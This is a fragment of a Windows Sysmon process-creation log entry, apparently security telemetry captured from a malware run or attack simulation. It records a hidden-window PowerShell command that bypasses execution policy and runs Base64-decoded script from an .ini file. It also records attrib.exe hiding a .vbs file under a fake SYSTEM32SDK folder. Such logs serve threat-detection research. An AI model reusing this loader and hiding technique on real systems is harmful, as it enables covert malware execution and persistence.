                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9D19-64AD-5606-000000004400}; ProcessId=1680; Product=Microsoft\\xae Windows\\xae Operating System; Description=Attribute Utility; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CE6-64AD-4906-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=FDC601145CD289C6FBC96D3F805F3CD7,SHA256=FF8600A444A3F086F17A24293E0172E6033D62C3766D4497997B882D663F8221,IMPHASH=2CB38FE7D8F223D9DA50B7CBA9B95A6D; OriginalFileName=ATTRIB.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4236; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\attrib.exe\" +s +h C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\attrib.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; UtcTime=1689099545; RuleName=-}"
                                                                                             },
